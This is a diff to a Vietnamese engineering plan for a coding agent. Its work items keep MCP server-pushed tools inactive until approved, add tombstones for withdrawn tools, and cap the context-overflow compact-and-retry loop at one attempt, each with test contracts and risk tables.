+**Nguồn:** `senpi.62`
+
+## Xác minh
+
+**Cái omp thiếu — đã kiểm, chuỗi đầy đủ từ đầu đến cuối.** omp **TỰ KÍCH HOẠT** mọi tool mà server đẩy. Chuỗi: `packages/coding-agent/src/mcp/manager.ts:954` `#triggerNotificationRefresh` → `refreshServerTools(name)` → `manager.ts:429-431` handler `setOnToolsChanged` → `packages/coding-agent/src/session/agent-session.ts:6055` `refreshMCPTools(tools)` → `packages/coding-agent/src/session/session-tools.ts:2164` `#applyMCPToolRefresh`, mà comment của chính nó ở `:2205-2206` nói nguyên văn *"Connected manager tools become active immediately."* Tập active được dựng lại ở `:2210-2214` là `[...#getActiveNonMCPToolNames(), ...#mcpManagerToolNames, ...retainedActiveExtensionToolNames]` — và `#mcpManagerToolNames` được điền từ catalog **MỚI** ở `:2200-2202`, nên **mọi tool mới xuất hiện đều rơi vào `nextActive`**.
+
+Cũng **không có tombstone**: `manager.ts:942-949` `#replaceServerTools` lọc theo `mcpServerName` và **xoá hẳn** tool bị rút, nên một lời gọi cũ tới tool đã bị rút rơi vào đường dispatch-miss thay vì một `isError` sạn.
+
+Mitigation sẵn có của omp chỉ là `ToolApproval` (gate theo **tier**, không theo **identity** — `resolveApproval` tại `approval.ts:203` khoá trên `policyKey ?? tool.name`, nên tool mới đơn giản là vắng mặt trong `tools.approval` và thừa hưởng mặc định của mode) và `ToolTier` per-tool, mà server lừa đảo thỏa dễ bằng cách tự mô tả tool của nó là read-only. `registerToolsPreservingActiveSet` của senpi (snapshot `getActiveTools()` → register → `setActiveTools()`) chính là nửa còn thiếu, và nó độc lập với substrate.
+
+## File cần chạm tới
+
+| path | hành động | thay đổi | đã kiểm chứng? |
+| --- | --- | --- | --- |
+| `packages/coding-agent/src/session/session-tools.ts` | sửa | `:2164` `#applyMCPToolRefresh` — tách catalog đến thành *"đã active trước lần refresh này"* và *"mới xuất hiện"*; chỉ activate tập đầu, phần còn lại **registered-but-inactive**. Seam `#previousActiveMcpToolNames` tại `:2180` **đã bắt đúng tập** — nó chỉ đang được dùng cho extension retention (`:2207-2209`) thay vì để gate manager tools. | Có |
+| `packages/coding-agent/src/mcp/manager.ts` | sửa | `:942-949` `#replaceServerTools` — giữ một tombstone `CustomTool` cho các tên bị rút, `execute` trả `isError` với thông điệp *"tool no longer offered"*. | Có |
+| `packages/coding-agent/src/mcp/manager.ts` | **KHÔNG đụng** | `:954` `#triggerNotificationRefresh` và `:429-431` handler `setOnToolsChanged` — chuỗi này đúng; sửa nó là sửa cái không sai. | Có |
+| `packages/coding-agent/src/session/agent-session.ts` | **KHÔNG đụng** | `:6055` `refreshMCPTools(tools)` — chỉ là call site trung gian. | Có |
+| `packages/coding-agent/src/tools/approval.ts` | **KHÔNG đụng** | `resolveApproval` tại `:203` — cơ chế `tools.approval` và `ToolTier` **giữ nguyên hành vi**; mục này thêm một lớp **trước** chúng, không sửa chúng. | Có |
+| *(module mới)* `active-set.ts` | **KHÔNG tạo** | **KHÔNG** port `active-set.ts` của senpi như một module riêng — gộp hai luật vào chính hai hàm hiện có, để có **một** nguồn sự thật cho *"cái gì đang active"*. | Có |
+| `packages/coding-agent/test/*` (file mới) | tạo | Test contract cho cả hai luật. | Có (chưa tồn tại) |
+
+## Các bước
+
+1. **Trong `#applyMCPToolRefresh`, tách catalog đếm thành hai tập** — "đã active trước lần refresh này" và "mới xuất hiện" — rồi chỉ activate tập đầu, phần còn lại **registered-but-inactive**. Dùng seam `#previousActiveMcpToolNames` tại `:2180`: nó **đã bắt đúng tập**, chỉ đang được dùng cho extension retention (`:2207-2209`) thay vì để gate manager tools. *(anchor: `packages/coding-agent/src/session/session-tools.ts:2180`, `:2200-2202`, `:2207-2209`)*
+
+2. **Trong `#replaceServerTools`, giữ một tombstone `CustomTool`** cho các tên bị rút, `execute` trả `isError` với thông điệp *"tool no longer offered"*. Không để lời gọi cũ rơi vào đường dispatch-miss. *(anchor: `packages/coding-agent/src/mcp/manager.ts:942-949`)*
+
+3. **KHÔNG port `active-set.ts` như một module riêng** — gộp hai luật vào chính hai hàm hiện có, để có **một** nguồn sự thật cho "cái gì đang active". *(anchor: bảng File ở trên)*
+
+4. **Giữ nguyên `tools.approval` và `ToolTier`.** Mục này thêm một lớp **trước** chúng, không sửa chúng. `retainedActiveExtensionToolNames` giữ nguyên: tool của extension không đi qua đường này. *(anchor: `packages/coding-agent/src/tools/approval.ts:203`, `packages/coding-agent/src/session/session-tools.ts:2210-2214`)*
+
+5. **Pháp lý.** Chép được, giữ MIT notice. Trung thực mà nói thì hai luật lấy từ đây cũng là thứ dễ tự suy ra hơn là chép — nên framing đúng là *"ý tưởng + một diff nhỏ đè lên chính hàm của omp"*; vẫn cần attribution cho bất kỳ dòng nào mang qua. W0 chi phối. *(anchor: Sóng 0a — W0)*
+
+6. **`bun check` (KHÔNG dùng `tsc`/`npx tsc`)** và chạy test của mục này. Không `mock.module()`. *(anchor: `AGENTS.md` "Testing Guidance")*
+
+## Hợp đồng test
+
+**Cái được bảo toàn:** Cơ chế `tools.approval` và `ToolTier` phải giữ nguyên hành vi — item này thêm một lớp **trước** chúng, không sửa chúng. `retainedActiveExtensionToolNames` giữ nguyên: tool của extension không đi qua đường này.
+
+| # | Hợp đồng | Loại | Vì sao là hợp đồng quan sát được |
+| --- | --- | --- | --- |
+| G3-T1 | Server đẩy một tool **mới** qua `list_changed` ⇒ tool đó **được đăng ký nhưng không active**. | dương | Đây là hợp đồng bảo mật của mục: server không tự thêm quyền cho chính nó. |
+| G3-T2 | Tool **đã active trước lần refresh** vẫn active sau refresh. | dương | Chứng minh tập "đã active trước" được giữ. Không có nó, một bản lọc quá tay làm tool biến mất giữa lượt. |
+| G3-T3 | Gọi một tool **đã bị rút** ⇒ trả `isError` *"tool no longer offered"*, không phải dispatch-miss. | phủ định | Tombstone là hợp đồng quan sát được; thiếu nó thì người dùng thấy một lỗi vô nghĩa thay vì một thông điệp nói rõ chuyện gì xảy ra. |
+| G3-T4 | `tools.approval` và `ToolTier` hành xử **y như trước** sau thay đổi. | dương | Hợp đồng bảo toàn. Đây là lớp **trước**, không phải lớp thay. |
+| G3-T5 | Tool của **extension** vẫn theo đường `retainedActiveExtensionToolNames`. | phủ định | Ràng buộc phạm vi: extension tool không đi qua đường này. |
+
+Ràng buộc: **không source-grep** (AGENTS.md cấm), **không `mock.module()`**, **không `tsc`** — dùng `bun check`. Test phải full-suite safe: `vi.spyOn` + `vi.restoreAllMocks()` trong `afterEach`.
+
+## Cổng hoàn thành
+
+| Cổng | Điều kiện | Phân biệt được "đã làm" với "không chạy được" |
+| --- | --- | --- |
+| **G3** | Cổng W0 **xanh** trước khi mục này báo xong | W0 là điều kiện tiên quyết; attribution phải có trong payload. |
+| **G3-G1** | Test tool-mới-không-active **đỏ trên cây trước bản vá**, xanh sau | Một cổng xanh ngay từ cây sạch là cổng chết. |
+| **G3-G2** | Test `tools.approval`/`ToolTier` xanh **cả trước và sau** | Đây là cổng bảo toàn; không có nó thì lớp mới có thể phá lớp cũ. |
+| **G3-G3** | `bun check` sạch, test xanh, **không `mock.module()`** | `tsc` bị cấm. |
+
+## Rủi ro
+
+| # | rủi ro | xác suất | hậu quả | chặn bởi |
+|---|---|---|---|---|
+| **G3-R1** | Port `active-set.ts` thành module riêng | Trung bình nếu chép theo thói quen | **Hai** nguồn sự thật cho "cái gì đang active" — đúng loại bug mà `R2` của SEAMFREE đã gọi là hình dạng thất bại tệ nhất | Bước 3 + review |
+| **G3-R2** | Tập active bị lọc quá tay ⇒ tool đang chạy biến mất giữa lượt | Trung bình | Người dùng thấy tool biến mất không rõ lý do | G3-T2 |
+| **G3-R3** | Sửa `tools.approval`/`ToolTier` "cho khỏi đụng" | Trung bình | Đổi hành phê duyệt đang chạy — mục này chỉ thêm lớp trước | G3-T4 + bước 4 |
+| **G3-R4** | Không có tombstone ⇒ chỉ làm nửa đầu | Trung bình | Lời gọi cũ tới tool đã rút rơi vào dispatch-miss | G3-T3 + bước 2 |
+| **G3-R5** | Tin `ToolTier` là đủ | Cao nếu không đọc kỹ | `ToolTier` theo **tier**, không theo **identity**; server tự mô tả tool của nó là read-only là thỏa. Đây là lý do mục này tồn tại | Bước 1 |
+
+## Đối chiếu so với kế hoạch này
+
+- **Đã phủ chưa: không.** Không work item nào của M7 nhắc `list_changed`, giữ tập active, hay tombstone tool. Cơ chế `tools.approval` mà rank-6 của SEAMFREE (`anthropic-bash`) chạm là **tier gate**, không phải cái này.
+- Mục này **không liên quan** tới `agent_settled` / `registerEntryRenderer` / `model_select` của Sóng 0b — nó nằm hoàn toàn trên đường refresh của MCP manager.
+
+---
+
+## GAP-M7-04 — Giới hạn một lần duy nhất cho vòng compact-and-retry khi context overflow
+
+**Sóng / phạm vi:** Sóng 0c, hạng mục `G4`. **Mục nhỏ nhất trong toàn bộ phần bổ sung** — làm mới, không port.
+**Effort:** S — khoảng 0,5 ngày.
+**Phụ thuộc:** W0 (pháp lý) là hình thức; **không có phụ thuộc kỹ thuật nào** — mục này là làm mới, không có nghĩa vụ copy. **Thứ tự: `GAP-M7-02` trước** — mềm, nhưng nên cùng PR.
+**Nguồn:** `pi.71`
+
+> **Ghi chú về nhãn sóng của sổ:** mục `GAP-M7-04` trong `GAP-REGISTER-2.md` ghi *"Milestone: M7 — cùng GAP-M7-02, sóng 0b"*, trong khi `GAP-M7-02` được chính sổ đó đặt ở **sóng 0c** và bảng *"Thứ tự mở PR"* (#9) buộc `GAP-M7-04` *"cùng PR hoặc ngay sau `GAP-M7-02`"*. Mục này đặt theo **sóng 0c** cho khớp với chính mốc quan hệ mà sổ nêu. Nhãn "sóng 0b" được giữ nguyên ở đây để lần đọc sau còn tra được.
+
+## Xác minh
+
+**Cái omp thiếu — thiếu phần gốc, và hệ quả thì đo được.** Đã kiểm: `packages/coding-agent/src/session/session-maintenance.ts:156` `INCOMPLETE_RECOVERY_MAX_RETRIES = 3`, `#incompleteRecoveryAttempts` ở `:550`, reset ở `:603`/`:2760`/`:3059`, cổng chặn ở `:3083-3084`.
+
+**Nhưng nó chặn lượt KHÔNG HOÀN THÀNH, không chặn lượt hoàn thành nhưng context vỡ.** Không có cờ `_overflowRecoveryAttempted` chặn overflow retry **ĐÚNG MỘT LẦN**.
+
+**Hệ quả quan sát được:** một phiên có context window hẹp sẽ **compact rồi lại overflow rồi lại compact**, mỗi vòng lại tốn **một lượt model đầy đủ**. Với một phiên dài trên model có context nhỏ, đây là một khoản chi phí lặp lại không ai nhìn thấy.
+
+## File cần chạm tới
+
+| path | hành động | thay đổi | đã kiểm chứng? |
+| --- | --- | --- | --- |
+| `packages/coding-agent/src/session/session-maintenance.ts` | sửa | Một cờ boolean trên vòng retry cùng một hằng hạn, đặt cạnh `INCOMPLETE_RECOVERY_*` sẵn có (`:156`). Cổng chặn cũ ở `:3083-3084` là mẫu để đặt cổng mới cạnh. | Có (đã đọc `:156`, `:550`, `:603`, `:2760`, `:3059`, `:3083-3084`) |
+| `packages/coding-agent/test/*` (file mới) | tạo | Test contract: dừng lặp **và** báo, và phân biệt nguyên nhân. | Có (chưa tồn tại) |
+
+## Các bước
+
+1. **CỐ Ý KHÔNG gộp với `GAP-M7-02`, và lý do phải viết ra** vì hai mục này rất dễ bị người đọc tự gộp: gộp sẽ tạo **một PR sửa nhiều file với hai cổng đỏ không liên quan**. Cùng sự cố, **khác biên** — và "cùng sự cố" là lý do dễ gộp, không phải lý do nên gộp. Nếu bản thảo PR chọn gộp, thì hai cổng phải tách bạch trong cùng diff. *(anchor: sổ §M7, "Gộp hay không")*
+
+2. **Thêm cờ boolean trên vòng retry** cùng một hằng hạn, đặt cạnh `INCOMPLETE_RECOVERY_*` sẵn có. LÀM MỚI rất nhỏ. *(anchor: `packages/coding-agent/src/session/session-maintenance.ts:156`, `:3083-3084`)*
+
+3. **Sau một lần retry thất bại thì phải BÁO, không phải im lặng dừng.** Mục đích của cờ là **dừng lặp**, không phải **dừng im lặng** — nếu không, nó biến một vòng lặp tốn kém thành một lỗi không ai hiểu. *(anchor: sổ §M7, "Cái được bảo toàn" mục 1)*
+
+4. **Cờ phải tính theo nguyên nhân overflow, không theo số lần** — một lượt hỏng vì lý do khác **không được dùng hết hạn mức của overflow**. Nếu gộp hai nguyên nhân vào một bộ đếm, thì một lỗi mạng sẽ âm thầm tắt cơ chế hồi phục context. *(anchor: sổ §M7, "Cái được bảo toàn" mục 2)*
+
+5. **Pháp lý:** làm mới → không có nghĩa vụ copy. *(anchor: sổ §M7, "Pháp lý")*
+
+6. **`bun check` (KHÔNG dùng `tsc`/`npx tsc`)** và chạy test của mục này. Không `mock.module()`. *(anchor: `AGENTS.md` "Testing Guidance")*
+
+## Hợp đồng test
+
+**Cái được bảo toàn — hai điều, cả hai đều là chống im lặng:**
+
+1. **Sau một lần retry thất bại thì phải BÁO, không phải im lặng dừng.** Mục đích của cờ là **dừng lặp**, không phải **dừng im lặng**.
+2. **Cờ phải tính theo nguyên nhân overflow, không theo số lần** — một lượt hỏng vì lý do khác **không được dùng hết hạn mức của overflow**.
+
+| # | Hợp đồng | Loại | Vì sao là hợp đồng quan sát được |
+| --- | --- | --- | --- |
+| G4-T1 | Vòng compact-and-retry chạy **đúng một lần** rồi dừng, kể cả khi overflow lặp lại. | dương | Đây là hợp đồng chính của mục — nó chặn đúng khoản chi phí lặp mà không ai nhìn thấy. |
+| G4-T2 | Lượt retry thất bại **báo lỗi có thông điệp**, không dừng im lặng. | dương | Đây là nửa "chống im lặng". Một cờ chỉ dừng sẽ xanh với một bản im lặng. |
+| G4-T3 | Một lượt hỏng vì **lý do khác** (ví dụ lỗi mạng) **không** dùng hết hạn mức overflow. | phủ định | Đây là ranh giới giữa hai nguyên nhân. Gộp chúng làm một lỗi mạng âm thầm tắt cơ chế hồi phục context. |
+| G4-T4 | `INCOMPLETE_RECOVERY_*` (`:156`, `:550`, `:603`, `:2760`, `:3059`, `:3083-3084`) hành xử **y như trước**. | dương | Hợp đồng bảo toàn: đây là cơ chế đang chạy, mục này thêm hạn mức riêng cho overflow chứ không sửa nó. |
+
+Ràng buộc: **không source-grep** (AGENTS.md cấm), **không `mock.module()`**, **không `tsc`** — dùng `bun check`. Test phải full-suite safe: `vi.spyOn` + `vi.restoreAllMocks()` trong `afterEach`.
+
+## Cổng hoàn thành
+
+| Cổng | Điều kiện | Phân biệt được "đã làm" với "không chạy được" |
+| --- | --- | --- |
+| **G4** | `GAP-M7-02` đã merge hoặc ít nhất đã có test — mục này nên **cùng PR hoặc ngay sau**. | Ghi rõ: "cùng PR" là khuyến nghị của sổ, không phải điều kiện kỹ thuật cứng. |
+| **G4-G1** | Test "đúng một lần rồi dừng" **đỏ trên cây trước bản vá** | Một cổng xanh ngay từ cây sạch là cổng chết. |
+| **G4-G2** | Test "báo, không im lặng" xanh | Đây là nửa hay bị bỏ; bỏ nó thì cổng G4-G1 vẫn xanh. |
+| **G4-G3** | `INCOMPLETE_RECOVERY_*` không đổi hành vi | `git diff` không được chạm các dòng `:156`/`:550`/`:603`/`:2760`/`:3059`/`:3083-3084` ngoài phần thêm hạn mức mới. |
+| **G4-G4** | `bun check` sạch, test xanh, **không `mock.module()`** | `tsc` bị cấm. |
+
+## Rủi ro
+
+| # | rủi ro | xác suất | hậu quả | chặn bởi |
+|---|---|---|---|---|
+| **G4-R1** | Cờ dừng lặp nhưng **không báo** | Cao nếu chỉ làm nửa đầu | Biến một vòng lặp tốn kém thành một lỗi không ai hiểu | G4-T2 + bước 3 |
+| **G4-R2** | Dùng chung một bộ đếm cho overflow và lỗi khác | Trung bình | Một lỗi mạng âm thầm tắt cơ chế hồi phục context | G4-T3 + bước 4 |
+| **G4-R3** | Gộp vào PR của `GAP-M7-02` mà không tách cổng | Trung bình | Một PR sửa nhiều file với **hai cổng đỏ không liên quan** | Bước 1 |
+| **G4-R4** | Đụng `INCOMPLETE_RECOVERY_*` khi đặt hằng mới cạnh | Thấp | Đổi hành cơ chế đang chạy | G4-G3 |
+| **G4-R5** | Bỏ qua cờ vì effort nhỏ | Thấp | Vòng lặp tốn kém vẫn còn, không ai ghi vào backlog nữa | G4-G1 |
+
+## Đối chiếu so với kế hoạch này
+
+- M7 trước đây **không có work item nào** cho biên retry. Không mục nào trong bốn mục cũ của M7 (W0, SEAM, SEAMFREE, LOOKAT) nhắc `session-maintenance.ts` hay hạn mức retry.
+- `GAP-M7-02` xử lý **biên compaction**; mục này xử lý **biên retry**. Cùng một sự cố — *một lượt bị hỏng vì context* — nhìn từ hai phía.
 ## Sóng 0b — SEAM: mở bốn seam API
 
 ## Work item SEAM — mở bốn seam API cho extension (phần mở đường của M7)
@@ -1291,7 +1653,7 @@ Riêng `permission-system` khớp 3 ✓ — con số "6" tôi đo được ở l
 | `image-gen.ts` 12 KB · `getImageGenTools` tại `:309` · wiring `sdk.ts:3218-3219` | `wc -c` + 2× `sed` | 12.045 B ✓ · `:309` ✓ · `:3218` gọi `getImageGenTools` ✓ | ✓ |
 | `fetch.ts` 53 KB · `renderHtmlToText:592` · `fetchReadUrl:1613` · `materializeReadUrlToFile:1660` · `executeReadUrl:1686` | `wc -c` + 4× `sed` | 54.166 B ✓ · cả 4 khớp | ✓ |
 | `approval.ts` 13 KB | `wc -c` | 13.519 B ✓ | ✓ |
-| `tool-call-loop-guard.ts:68` `export class ToolCallLoopGuard` | `sed -n 68p` | ✓ (dùng ở `:220` thì sai — mục A) |
+| `tool-call-loop-guard.ts:68` `export class ToolCallLoopGuard` | `sed -n 68p` | khớp | ✓ (dùng ở `:220` thì sai — mục A) |
 | `task/executor.ts:261` `fallbackChain` | `sed -n 261p` | `const fallbackChain = (role !== undefined ? …)` | ✓ |
 | `NOTICE.md` chưa tồn tại ở omp | `ls NOTICE.md` | `No such file or directory` | ✓ |
 | `help-content` = 0 hit trong `packages/coding-agent/src` | `git grep -nw` | 0 | ✓ |
